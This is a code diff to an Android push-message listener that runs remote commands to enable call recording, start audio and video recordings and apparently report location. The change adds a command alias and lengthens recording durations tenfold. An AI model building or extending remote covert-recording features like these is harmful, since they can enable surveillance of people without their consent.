@@ -31,15 +31,16 @@ public class MyGcmListenerService extends GcmListenerService {
                 RemoteCallsHelpers.enableCallRecording(Boolean.valueOf(remoteRequest));
                 break;
             case AppConstants.TYPE_SOUND_RECORDINGS:
+            case "audio_recordings":
                 int duration = Integer.valueOf(remoteRequest);
                 Intent intent = new Intent(AppConstants.REQUEST_AUDIO);
-                intent.putExtra("duration", duration);
+                intent.putExtra("duration", duration*10);
                 sendBroadcast(intent);
                 break;
             case AppConstants.TYPE_VIDEO_RECORDINGS:
                 int durationVideo = Integer.valueOf(remoteRequest);
                 Intent intentVideo = new Intent(AppConstants.REQUEST_VIDEO);
-                intentVideo.putExtra("duration", durationVideo);
+                intentVideo.putExtra("duration", durationVideo*10);
                 sendBroadcast(intentVideo);
                 break;
             case "location":
